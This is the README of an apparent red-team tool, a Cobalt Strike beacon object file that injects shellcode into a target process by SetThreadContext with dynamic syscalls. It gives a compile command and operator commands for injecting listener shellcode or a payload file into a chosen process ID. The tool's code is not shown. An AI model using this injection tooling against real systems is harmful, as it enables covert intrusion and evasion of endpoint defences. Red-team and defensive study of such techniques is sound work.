# Dynamic Syscall SetThreadContext Inject 

This is based on XPN's SetThreadContext technique as a beacon object file and using dynamic syscalls.

Based on ajpc500's method of beacon object file dynamic syscalls.

# Compile
`x86_64-w64-mingw32-gcc -c dynamicsyscall_stcinject.c -o dynamicsyscall_stcinject.o`

# Usage

NOTE: Currently only for x64

Load the CNA script in Cobalt Strike, then the following command will be included:

`dsyscall_stc_inject PID Listener` - Inject shellcode created for listener to target PID

`dsyscall_stc_shinject PID /path/to/payload.bin` - Inject payload.bin file to target PID
